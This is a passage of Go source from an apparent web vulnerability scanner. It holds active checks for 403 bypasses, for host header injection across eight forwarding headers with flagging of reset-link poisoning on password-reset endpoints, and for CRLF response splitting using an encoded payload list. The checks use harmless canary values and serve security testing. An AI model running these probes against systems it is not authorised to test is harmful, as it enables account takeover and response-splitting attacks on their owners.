		loc := "header"
		if att.authHeader {
			conf = ConfPoC
			loc = "authorization_header"
		} else if att.path != "" {
			// A normalized path can map to a separate public route. Preserve it as a
			// strong candidate unless a later identity-aware verifier proves it is
			// the same protected object.
			conf = ConfCandidateHi
			loc = "path"
		}
		return att.label, fmt.Sprintf("stable controls: %d/%d (%d/%d bytes); stable bypass replay: 200/200 (%d/%d bytes) via %s; protected and bypass bodies are materially different", bStatus1, bStatus2, len(baseline1), len(baseline2), len(body1), len(body2), att.label), conf, loc
	}
	return "", "", 0, ""
}

func isAccessDeniedStatus(status int) bool {
	return status == http.StatusUnauthorized || status == http.StatusForbidden
}

func looksLike403AuthWall(body string) bool {
	lower := strings.ToLower(body)
	for _, phrase := range []string{"sign in", "log in", "login required", "authentication required", "please authenticate", "unauthorized", "access denied", "permission denied", "403 forbidden"} {
		if strings.Contains(lower, phrase) {
			return true
		}
	}
	// A real login form is an auth wall. A harmless occurrence such as
	// "audit_login_events" in actual admin content is not.
	return strings.Contains(lower, "<form") &&
		(strings.Contains(lower, `type="password"`) || strings.Contains(lower, `type='password'`) || strings.Contains(lower, `name="password"`) || strings.Contains(lower, `name='password'`))
}

func mutate403Path(base *url.URL, escapedPath string) string {
	u := *base
	u.RawPath = escapedPath
	if decoded, err := url.PathUnescape(escapedPath); err == nil {
		u.Path = decoded
	} else {
		u.Path = escapedPath
		u.RawPath = ""
	}
	return u.String()
}

func fetch403Response(ctx context.Context, rawURL string, headers map[string]string) (int, string) {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", rawURL, nil)
	if err != nil {
		return 0, ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return 0, ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return resp.StatusCode, string(body)
}

func fetchBodyLen(ctx context.Context, rawURL string, headers map[string]string) int {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", rawURL, nil)
	if err != nil {
		return -1
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return -1
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return len(body)
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

// ── Host Header Injection ────────────────────────────────────────────────────

func (s *VulnScanner) RunHostHeaderInjection(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "host_header", "Checking host header injection...")

	rows, err := s.db.QueryContext(ctx, `
		SELECT url FROM http_services WHERE target_id = ? AND status_code BETWEEN 200 AND 403
		UNION
		SELECT url FROM parameters WHERE target_id = ?
		LIMIT ?
	`, targetID, targetID, s.cfg.URLLimit())
	if err != nil {
		return err
	}
	var urls []string
	for rows.Next() {
		var u string
		if err := rows.Scan(&u); err == nil {
			urls = append(urls, u)
		}
	}
	rows.Close()
	urls = dedupeWebBehaviorURLs(filterURLsByHostScope(ctx, urls))

	logFn("info", "host_header", fmt.Sprintf("Testing %d endpoints for host header injection...", len(urls)))
	auth := loadAuthHeaders(ctx, s.db, targetID)

	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, svcURL := range urls {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			if evidence, sev, confidence := checkHostHeaderWithAuth(ctx, u, auth); evidence != "" {
				s.storeVulnSurface(targetID, "host_header_injection", sev, u, "GET", "Host", "header", "two random host values", evidence, "dual-host-sink-replay", confidence)
				found.Add(1)
				logFn("warn", "host_header", fmt.Sprintf("Host header injection: %s", u))
				if s.broadcast != nil && confidence >= ConfEvidence {
					s.broadcast("new_vuln_finding", map[string]any{
						"target_id": targetID,
						"type":      "host_header_injection",
						"url":       u,
					})
				}
			}
		}(svcURL)
	}
	wg.Wait()
	logFn("info", "host_header", fmt.Sprintf("Host header check done. Found %d issues.", found.Load()))
	return nil
}

// checkHostHeader tries each host-injection vector SEPARATELY so we know which
// header the app trusts, and elevates severity on password-reset / auth
// endpoints (where a poisoned host means account-takeover via reset-link
// poisoning). A Location/link carrying the injected host is exploitable; a bare
// body echo is low signal.
func checkHostHeader(ctx context.Context, rawURL string) (string, string) {
	evidence, severity, _ := checkHostHeaderWithAuth(ctx, rawURL, nil)
	return evidence, severity
}

func checkHostHeaderWithAuth(ctx context.Context, rawURL string, auth map[string]string) (string, string, int) {
	probe1 := "rcnhh" + randomCanary()[len(reflectMarker):] + ".example"
	probe2 := "rcnhh" + randomCanary()[len(reflectMarker):] + ".example"

	// Each vector applied on its own request.
	vectors := []struct {
		name  string
		apply func(*http.Request, string)
	}{
		{"Host", func(r *http.Request, h string) { r.Host = h }},
		{"X-Forwarded-Host", func(r *http.Request, h string) { r.Header.Set("X-Forwarded-Host", h) }},
		{"X-Host", func(r *http.Request, h string) { r.Header.Set("X-Host", h) }},
		{"X-Forwarded-Server", func(r *http.Request, h string) { r.Header.Set("X-Forwarded-Server", h) }},
		{"X-HTTP-Host-Override", func(r *http.Request, h string) { r.Header.Set("X-HTTP-Host-Override", h) }},
		{"X-Original-Host", func(r *http.Request, h string) { r.Header.Set("X-Original-Host", h) }},
		{"Forwarded host", func(r *http.Request, h string) { r.Header.Set("Forwarded", "host="+h) }},
		{"X-Original-URL absolute", func(r *http.Request, h string) { r.Header.Set("X-Original-URL", "https://"+h+r.URL.RequestURI()) }},
	}

	// Password-reset / auth context → a poisoned host is account takeover.
	lowerURL := strings.ToLower(rawURL)
	resetContext := false
	for _, kw := range []string{"reset", "forgot", "password", "recover", "confirm", "activate", "verify", "magic", "login"} {
		if strings.Contains(lowerURL, kw) {
			resetContext = true
			break
		}
	}

	type hostResult struct{ kind, detail string }
	results := make([]hostResult, len(vectors))
	var wg sync.WaitGroup
	for i, vec := range vectors {
		wg.Add(1)
		go func(index int, apply func(*http.Request, string)) {
			defer wg.Done()
			results[index].kind, results[index].detail = hostHeaderProbe(ctx, rawURL, auth, probe1, apply)
		}(i, vec.apply)
	}
	wg.Wait()
	for i, vec := range vectors {
		kind1, detail1 := results[i].kind, results[i].detail
		if kind1 == "" {
			continue
		}
		kind2, detail2 := hostHeaderProbe(ctx, rawURL, auth, probe2, vec.apply)
		if kind2 != kind1 {
			continue
		}
		sev := "medium"
		conf := ConfCandidateHi
		if kind1 == "location" {
			sev = "high"
			conf = ConfMultiTool
		} else if resetContext {
			sev = "high"
		}
		return fmt.Sprintf("%s controls an executable %s sink with two independent hosts (%s; %s)%s", vec.name, kind1, detail1, detail2, resetNote(resetContext)), sev, conf
	}
	return "", "", 0
}

func hostHeaderProbe(ctx context.Context, rawURL string, auth map[string]string, probe string, apply func(*http.Request, string)) (kind, detail string) {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", rawURL, nil)
	if err != nil {
		return "", ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0")
	for k, v := range auth {
		req.Header.Set(k, v)
	}
	apply(req, probe)
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return "", ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
	resp.Body.Close()
	if loc := strings.TrimSpace(resp.Header.Get("Location")); loc != "" {
		if base, err := url.Parse(rawURL); err == nil && hostFromLocation(loc, base) == probe {
			return "location", "Location=" + loc
		}
	}
	for _, header := range []string{"Content-Location", "Link", "Refresh"} {
		value := strings.TrimSpace(resp.Header.Get(header))
		if hostSinkContainsProbe(value, probe) {
			return "response-header-url", header + "=" + value
		}
	}
	bodyStr := string(body)
	if doc, err := xhtml.Parse(strings.NewReader(bodyStr)); err == nil {
		var walk func(*xhtml.Node) (string, bool)
		walk = func(node *xhtml.Node) (string, bool) {
			if node.Type == xhtml.ElementNode {
				for _, attr := range node.Attr {
					switch strings.ToLower(attr.Key) {
					case "href", "src", "action", "formaction", "content", "data":
						if hostSinkContainsProbe(attr.Val, probe) {
							return node.Data + "[" + attr.Key + "]=" + attr.Val, true
						}
					}
				}
			}
			for child := node.FirstChild; child != nil; child = child.NextSibling {
				if value, ok := walk(child); ok {
					return value, true
				}
			}
			return "", false
		}
		if detail, ok := walk(doc); ok {
			return "html-url", detail
		}
	}
	if hostSinkContainsProbe(bodyStr, probe) {
		return "body-url", "absolute or scheme-relative URL in structured response body"
	}
	return "", ""
}

func hostSinkContainsProbe(value, probe string) bool {
	lower := strings.ToLower(value)
	probe = strings.ToLower(probe)
	return strings.Contains(lower, "https://"+probe) ||
		strings.Contains(lower, "http://"+probe) ||
		strings.Contains(lower, "//"+probe)
}

func resetNote(reset bool) string {
	if reset {
		return " — on a password-reset/auth endpoint this is account takeover via reset-link poisoning"
	}
	return ""
}

// ── CRLF Injection ──────────────────────────────────────────────────────────

func (s *VulnScanner) RunCRLF(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "crlf_scan", "Checking CRLF injection...")

	limit := 150
	if s.cfg != nil && s.cfg.URLLimit() > 0 && s.cfg.URLLimit() < limit {
		limit = s.cfg.URLLimit()
	}
	items := loadRoutedInsertionPoints(ctx, s.db, targetID, ClassCRLF, limit, 48)
	auth := loadAuthHeaders(ctx, s.db, targetID)

	logFn("info", "crlf_scan", fmt.Sprintf("Testing %d parameters for CRLF...", len(items)))

	sem := make(chan struct{}, 10)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, item := range items {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(ip insertionPoint) {
			defer wg.Done()
			defer func() { <-sem }()

			name1, value1 := newCRLFMarker()
			payloads := crlfPayloads(name1, value1)
			observed := make([]bool, len(payloads))
			var probes sync.WaitGroup
			for idx, payload := range payloads {
				probes.Add(1)
				go func(i int, candidate string) {
					defer probes.Done()
					observed[i] = s.crlfHeaderObserved(ctx, ip, candidate, auth, name1, value1)
				}(idx, payload)
			}
			probes.Wait()
			for idx, payload := range payloads {
				if ctx.Err() != nil {
					return
				}
				if !observed[idx] {
					continue
				}
				// Reconfirm with a completely different header name/value. A fixed
				// response header or cache artifact cannot satisfy both probes.
				name2, value2 := newCRLFMarker()
				payload2 := crlfPayloads(name2, value2)[idx]
				if !s.crlfHeaderObserved(ctx, ip, payload2, auth, name2, value2) {
					continue
				}
				evidence := fmt.Sprintf("Response-splitting reproduced with two independent injected headers (%s and %s); method=%s location=%s", name1, name2, ip.Method, insertionLocation(ip))
				s.storeVulnPoint(targetID, "crlf", "high", ip, payload, evidence, "dual-random-header-replay", ConfPoC)
				found.Add(1)
				logFn("warn", "crlf_scan", fmt.Sprintf("CRLF injection: %s param=%s [%s %s]", ip.URL, ip.Param, ip.Method, insertionLocation(ip)))
				if s.broadcast != nil {
					s.broadcast("new_vuln_finding", map[string]any{
						"target_id": targetID, "type": "crlf", "url": ip.URL, "parameter": ip.Param,
					})
				}
				return
			}
		}(item)
	}
	wg.Wait()
	logFn("info", "crlf_scan", fmt.Sprintf("CRLF scan done. Found %d vulnerabilities.", found.Load()))
	return nil
}

func newCRLFMarker() (name, value string) {
	token := randomCanary()
	return "X-Recon-" + token[len(token)-12:], token
}

func crlfPayloads(name, value string) []string {
	header := name + ": " + value
	return []string{
		"%0d%0a" + header,
		"%0a" + header,
		"\r\n" + header,
		"%250d%250a" + header,         // double-decoding chains
		"%25250d%25250a" + header,     // triple-decoding chains
		"%%0d0a" + header,             // legacy percent-normalisation chains
		"%E5%98%8A%E5%98%8D" + header, // Unicode CR/LF normalization
	}
}

func (s *VulnScanner) crlfHeaderObserved(ctx context.Context, ip insertionPoint, payload string, auth map[string]string, name, value string) bool {
	reqCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()
	req, err := buildInjectedRequest(reqCtx, ip, payload, auth)
	if err != nil {
		return false
	}
	resp, err := vulnHTTPClient.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return strings.TrimSpace(resp.Header.Get(name)) == value
}

// ── Storage ──────────────────────────────────────────────────────────────────

func (s *VulnScanner) storeVuln(targetID, vulnType, severity, rawURL, param, payload, evidence string) {
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: vulnType, Severity: severity, URL: rawURL,
		Method: "GET", Parameter: param, Location: "query", Payload: payload, Evidence: evidence,
		Source: "vuln-scanner", DetectionMethod: "active-differential",
		Confidence: ConfEvidence, Verdict: VerifyVerified,
	})
}

func (s *VulnScanner) storeVulnPoint(targetID, vulnType, severity string, ip insertionPoint, payload, evidence, method string, confidence int) {
	s.storeVulnSurface(targetID, vulnType, severity, ip.URL, ip.Method, ip.Param, insertionLocation(ip), payload, evidence, method, confidence)
}

func (s *VulnScanner) storeVulnSurface(targetID, vulnType, severity, rawURL, requestMethod, param, location, payload, evidence, detectionMethod string, confidence int) {
	verdict := CandDetected
	if confidence >= ConfEvidence {
		verdict = VerifyVerified
	}
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: vulnType, Severity: severity, URL: rawURL,
		Method: requestMethod, Parameter: param, Location: location, Payload: payload, Evidence: evidence,
		Source: "vuln-scanner", DetectionMethod: detectionMethod,
		Confidence: confidence, Verdict: verdict,
	})
}

// storeVulnConf stores a finding with an explicit confidence + status, for
// checks that actively PROVE the bug (dalfox POC, context-aware XSS breakout in
// an executable context) so the verify band doesn't demote them to candidate.
func (s *VulnScanner) storeVulnConf(targetID, vulnType, severity, rawURL, param, payload, evidence string, confidence int) {
	verdict := CandDetected
	if confidence >= ConfEvidence {
		verdict = VerifyVerified
	}
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: vulnType, Severity: severity, URL: rawURL,
		Method: "GET", Parameter: param, Location: "query", Payload: payload, Evidence: evidence,
		Source: "vuln-scanner", DetectionMethod: "active-differential",
		Confidence: confidence, Verdict: verdict,
	})
}
